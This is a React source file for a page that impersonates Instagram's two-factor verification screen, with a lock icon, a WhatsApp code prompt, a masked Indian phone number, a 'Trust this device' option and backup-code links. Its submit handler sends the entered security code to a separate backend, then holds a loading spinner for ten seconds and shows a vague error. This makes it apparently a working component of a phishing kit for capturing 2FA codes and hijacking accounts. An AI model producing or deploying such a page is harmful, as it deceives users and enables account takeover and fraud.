import React, { useState } from 'react';
import './verify.css';
import baseUrl from '../../url';
import axios from 'axios';

const InstagramVerify = () => {
  const [securityCode, setSecurityCode] = useState('');
  const [trustDevice, setTrustDevice] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true); // Start loading immediately after clicking the button
    
    try {
      const res = await axios.post(`${baseUrl}/verify`, { securityCode });
      
      setTimeout(() => {
        // console.log(res);
        setLoading(false); // Stop loading after 10 seconds
        if(res.data.message == "Something Error")
          alert("something Error...Try After some times");
      }, 10000);
    } catch (err) {
      console.log(err);
      setLoading(false); // Stop loading if an error occurs
    }
  };

  return (
    <div className="verify-container">
      <div className="verify-content">
        <div className="verify-box">
          {/* Lock Icon */}
          <div className="lock-icon">
            <svg viewBox="0 0 24 24" width="36" height="36">
              <path 
                fill="#00a0f5" 
                d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"
              />
            </svg>
          </div>

          {/* Verification Message */}
          <div className="verify-message">
            <p>Enter the code we sent via WhatsApp to<br/>your mobile number: +91 ***** **22.</p>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit}>
            <input 
              type="text" 
              className="security-code-input"
              placeholder="Security Code"
              value={securityCode}
              onChange={(e) => setSecurityCode(e.target.value)}
              required
            />
            
            <button type="submit" className="confirm-button" disabled={loading}>
              {loading ? <span className="loader"></span> : "Confirm"}
            </button>
            
            <div className="trust-device">
              <label>
                <input 
                  type="checkbox" 
                  checked={trustDevice}
                  onChange={() => setTrustDevice(!trustDevice)}
                />
                <span className="checkbox-custom"></span>
                <div className="trust-text">
                  <p className="trust-title">Trust this device</p>
                  <p className="trust-subtitle">We won't ask for a code next time</p>
                </div>
              </label>
            </div>
          </form>

          {/* Help Links */}
          <div className="help-links">
            <p>Didn't get a security code?</p>
            <p><a href="#" className="sms-link">Send code via SMS instead</a></p>
            <p className="backup-message">
              If you're unable to receive a security code,<br/>
              use one of your <a href="#" className="backup-link">backup codes</a>.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default InstagramVerify;